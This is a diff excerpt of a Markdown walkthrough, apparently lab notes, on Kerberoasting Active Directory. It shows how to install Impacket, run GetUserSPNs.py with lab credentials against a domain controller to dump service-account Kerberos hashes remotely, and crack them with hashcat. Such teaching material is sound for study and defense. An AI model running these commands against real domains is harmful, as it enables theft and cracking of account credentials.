@@ -16,5 +16,17 @@ In order to perform the attack, we'll be using both Rubeus as well as Impacket s
 
 	''hashcat -m 13100 -a 0 hash.txt wordlist.txt'' 
 
+## Kerberoasting with Impacket 
 
+1. Install Impacket from: https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
 
+	1. cd Impacket-0.9.19
+	2. pip install . - this will install all needed dependencies
+
+2. Use the command:
+
+	'''sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request'''
+
+This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
+
+3. hashcat -m 13100 -a 0 hash.txt Pass.txt - now you can crack those hashes
